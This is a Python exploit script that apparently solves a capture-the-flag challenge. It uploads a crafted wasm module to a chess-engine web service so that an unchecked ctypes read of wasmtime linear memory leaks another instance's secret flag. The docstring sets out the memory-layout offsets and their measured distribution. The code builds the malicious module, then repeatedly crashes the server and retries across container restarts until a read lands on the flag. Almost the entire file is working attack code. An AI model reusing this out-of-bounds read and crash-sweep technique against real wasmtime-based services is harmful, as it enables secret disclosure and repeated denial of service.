#!/usr/bin/env python3
"""Leak the bee's secret from wasmtime linear memory via an unchecked data_ptr().

mcu-max.py hosts two chess engines as separate wasmtime Instances: BEE_PLAYER
(the shipped mcu-max.wasm, whose global ``fen_buf[256]`` is compiled with
``= FLAG`` -- see mcu-max-wrap.c:3) and BADGER_PLAYER, an *arbitrary* wasm
module uploaded by the client via POST /api/upload and instantiated with
``imports=[]`` (no import restrictions, so any exports work).

The bug: Player.best_move() reads the engine's reply with

    ptr = self.__best_move(self.__store)
    while b := self.__memory[ptr + len(move)]:
        ...

``self.__memory`` is ``Memory.data_ptr(store)`` -- a raw ctypes pointer to the
instance's linear memory base, *not* wasmtime's bounds-checked read/write API.
ctypes performs no bounds checking, so any ``ptr`` our own uploaded module's
``best_move()`` export chooses to return is dereferenced directly against the
host process's real address space. Since we fully control BADGER_PLAYER's
wasm bytecode (only "memory"/"fen_buffer"/"best_move" exports are required,
with no signature check), we make ``best_move`` return an i64 (not i32 --
that matters, see below) constant instead of a real move pointer -> an
out-of-bounds *read* primitive rooted at our own instance's memory base.
(wasmtime-py marshals the i64 result via a *signed* c_int64 union field, so a
returned value with the high bit set becomes a negative Python int and reads
*below* badger's base -- the primitive is bidirectional. We only need the
upward direction here since bee is placed above badger.)

------------------------------------------------------------------------------
OFFSET MODEL (revised -- see david_writeup.md #3, "Дополнительное
исследование (offline)"). Both wasm memories are 4GiB-class *static*
reservations: wasmtime 45.0.0 defaults to ``memory_reservation`` = 4GiB with a
32MiB guard *before* and *after* linear memory, so each instance occupies one
``0x104000000``-byte (4GiB + 64MiB) anonymous PROT_NONE mmap, of which only the
declared initial pages are mprotect'd RW. BEE_PLAYER is created first (at
import), BADGER_PLAYER second (at the first /api/upload); Linux places the two
reservations top-down, so badger lands *below* bee.

The gap is NOT a clean ``0x104000000``. Under the *real* uvicorn/FastAPI server
(not a bare script), a boot-time-variable number of ~64MiB allocations
(glibc malloc arenas / thread-stack guards spun up during uvicorn startup)
land *between* bee's and badger's reservations, pushing badger further down in
quantized 64MiB steps. Measured across ~60 fresh Docker boots (native arm64,
full ASLR) and confirmed end-to-end by actually leaking the placeholder flag:

    bee_base - badger_base  ==  0x104000000 + k * 0x04000000,   k in {0, 1, 2}

    distribution ~ k=0 (45%), k=1 (7%), k=2 (48%)

So the absolute read target relative to our own data_ptr() is

    OFFSET(k) = 0x104000000 + k*0x04000000 + 0x430

fen_buf sits at a fixed static offset 1072 = 0x430 inside bee's own linear
memory (mcu-max.wat data segment). We SWEEP k across crash-restarts.

Why the old single-constant 0x104000430 failed on prod: the writeup's original
gap was calibrated in a *bare script* (create bee, create badger, print) which
has none of the intervening uvicorn allocations, so it always saw the clean
0x104000000 (k=0). Emulated amd64 under Docker Desktop (QEMU/Rosetta) also
always shows k=0 -- an emulation artifact (serialized thread startup removes
the arena race). Real-hardware Linux (native arm64 here, and real amd64 prod)
has the race, so k jitters. The earlier prod attempts also swept the WRONG
grid -- multiples of 0x104000000 (guessing whole extra *reservations*) -- when
the real quantum is 0x04000000 (64MiB, a fraction of one reservation). Every
such guess except a k=0 boot with N=1 was structurally guaranteed to miss.

A wrong offset dereferences a PROT_NONE guard/gap page -> SIGSEGV -> the whole
Python process dies. docker-compose.yml sets ``restart: unless-stopped``
(stop_grace_period 0s), so a crash just restarts the container with a *fresh*
random k; we retry with the next candidate. There is no non-crashing way to
probe k in-band (ctypes deref of an unmapped page cannot raise a Python
exception; declaring a full 4GiB own-memory does not help because bee is in an
*adjacent* reservation, always above our own max; and no fixed-offset
"signpost" pointer to bee's base exists -- see writeup #3). So a small,
structured k-sweep across restarts is the most reliable primitive.

Usage:
    uv run david/solve_david.py --url https://<live-instance>/
"""

from __future__ import annotations

import argparse
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import requests

WAT_TEMPLATE = """(module
  (memory (export "memory") 1)
  (func (export "fen_buffer") (result i32)
    i32.const 0)
  (func (export "best_move") (result i64)
    i64.const {offset})
)
"""

FEN_BUF_OFFSET_IN_BEE_MEMORY = 0x430  # mcu-max.wat: data $.data (i32.const 1072) "avito{...}"
BASE_GAP = 0x104000000  # minimum bee-badger stride: 4GiB reservation + 64MiB (guard before+after)
STEP = 0x04000000  # 64MiB: quantum of intervening malloc-arena/thread-guard allocations

# CRITICAL: each crash-restart yields a FRESH, INDEPENDENT random k (not a fixed
# per-instance value we can converge on by elimination). A miss gives no in-band
# signal -- it just SIGSEGVs. So the sweep must not "cycle through all k" (that
# wastes restarts on k values that never occur, e.g. k>=3 here); instead it must
# fire the *highest-probability* candidates on most restarts. Measured k
# distribution ~ {0:45%, 1:7%, 2:48%}: k=0 and k=2 together cover ~93%, so we
# fire those two on ~2/3 of restarts, sprinkle k=1, and only rarely probe wider
# k (a safety net in case a many-core prod host spins up more startup arenas and
# shifts/broadens the distribution). Firing the dominant pair ~every restart
# gives p(hit)~0.46/restart -> typically 1-3 restarts to the flag.
K_SWEEP = [
    0,
    2,
    0,
    2,
    1,
    0,
    2,
    0,
    2,
    1,
    0,
    2,
    3,
    0,
    2,
    1,
    0,
    2,
    4,
    0,
    2,
    1,
    5,
    0,
    2,
    6,
    0,
    2,
    7,
    0,
    2,
    8,
]


def candidate_offsets() -> list[int]:
    """The ordered list of absolute read offsets to try, one per crash-restart."""
    return [BASE_GAP + k * STEP + FEN_BUF_OFFSET_IN_BEE_MEMORY for k in K_SWEEP]


# Back-compat: the single best first guess (k=0). Kept for --offset default.
LEAK_TARGET = BASE_GAP + FEN_BUF_OFFSET_IN_BEE_MEMORY  # 0x104000430


def build_badger_wasm(offset: int) -> bytes:
    """Compile the malicious BADGER_PLAYER module with wat2wasm.

    Args:
        offset: absolute i64 value best_move() should return, interpreted by
            the vulnerable Python glue as ``data_ptr(badger_store) + offset``.

    Returns:
        The compiled wasm module bytes.
    """
    wat = WAT_TEMPLATE.format(offset=offset)
    with tempfile.TemporaryDirectory() as tmp:
        wat_path = Path(tmp) / "badger.wat"
        wasm_path = Path(tmp) / "badger.wasm"
        wat_path.write_text(wat)
        subprocess.run(["wat2wasm", str(wat_path), "-o", str(wasm_path)], check=True)
        return wasm_path.read_bytes()


def _attempt(base_url: str, wasm_bytes: bytes) -> str:
    """Run one upload+leak attempt; raises requests exceptions on failure."""
    session = requests.Session()

    up = session.post(
        base_url.rstrip("/") + "/api/upload",
        files={"file": ("badger.wasm", wasm_bytes, "application/wasm")},
        timeout=10,
    )
    up.raise_for_status()

    # fields[1] must be 'b' to route to BADGER_PLAYER; the whole string is
    # otherwise irrelevant (fen_buffer() safely returns 0, inside our own
    # memory, so the write side of best_move() never goes OOB).
    res = session.get(
        base_url.rstrip("/") + "/api/best-move",
        params={"fen": "x b"},
        timeout=10,
    )
    res.raise_for_status()
    return res.json()["best_move"]


def _wait_until_up(base_url: str, timeout_s: float = 30.0) -> None:
    """Poll base_url until it answers, e.g. after a crash-induced container restart."""
    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        try:
            requests.get(base_url, timeout=2)
            return
        except requests.exceptions.RequestException:
            time.sleep(1)


def leak_flag(base_url: str, offsets: list[int] | None = None, retries: int = 24) -> str:
    """Upload the malicious module and trigger the OOB read, sweeping candidate
    offsets across crash-restarts.

    The (offset - BEE fen_buf) relationship is
    ``BASE_GAP + k*STEP`` with k a boot-time-random small integer (measured
    {0,1,2}; distribution ~45/7/48%). We cannot detect k in-band without
    crashing, so we cycle the ``candidate_offsets()`` list -- ordered by
    observed frequency -- firing one per boot. A miss dereferences an unmapped
    guard page and SIGSEGVs the whole process; docker-compose.yml's
    ``restart: unless-stopped`` brings the container back with a fresh random
    k a couple seconds later, and we advance to the next candidate.

    With p(hit) ~0.45 for the most likely single candidate, and independent k
    per boot, convergence is typically 1-3 restarts and P(success within the
    retry budget) is ~1. See david_writeup.md #3.

    Args:
        base_url: root URL of a live goliath instance (after the reCAPTCHA gate).
        offsets: ordered candidate offsets to sweep (defaults to
            ``candidate_offsets()``).
        retries: how many crash-and-restart cycles to tolerate.

    Returns:
        The leaked NUL-terminated string read starting at the OOB pointer
        (the flag when the fired candidate matches this boot's k and
        BEE_PLAYER's fen_buf has not been overwritten by a 'w'-side call).
    """
    if offsets is None:
        offsets = candidate_offsets()

    last_exc: Exception | None = None
    for attempt in range(retries):
        offset = offsets[attempt % len(offsets)]
        wasm_bytes = build_badger_wasm(offset)
        try:
            result = _attempt(base_url, wasm_bytes)
        except requests.exceptions.RequestException as exc:
            last_exc = exc
            print(
                f"[attempt {attempt + 1}/{retries}] offset=0x{offset:x} "
                f"likely crashed on an OOB guard page ({exc.__class__.__name__}); "
                f"waiting for restart...",
                file=sys.stderr,
            )
            _wait_until_up(base_url)
            continue
        if result.startswith("avito{"):
            print(
                f"[+] hit with offset=0x{offset:x} (k={(offset - LEAK_TARGET) // STEP})",
                file=sys.stderr,
            )
            return result
        # Non-crash, non-flag: landed on a mapped-but-wrong page (rare for our
        # candidates, which otherwise hit PROT_NONE). Treat as a miss and try
        # the next candidate without waiting for a restart.
        print(
            f"[attempt {attempt + 1}/{retries}] offset=0x{offset:x} returned "
            f"non-flag {result!r:.48}; advancing candidate.",
            file=sys.stderr,
        )
    raise RuntimeError(f"all {retries} attempts failed") from last_exc


def main() -> int:
    """CLI entry point."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="live goliath instance base URL")
    parser.add_argument(
        "--offset",
        type=lambda s: int(s, 0),
        default=None,
        help="pin a single OOB read offset (default: sweep the calibrated k-candidate list)",
    )
    parser.add_argument("--retries", type=int, default=24, help="crash-restart retry budget")
    args = parser.parse_args()

    offsets = [args.offset] if args.offset is not None else None
    flag = leak_flag(args.url, offsets, args.retries)
    print(flag)
    return 0 if flag.startswith("avito{") else 1


if __name__ == "__main__":
    sys.exit(main())
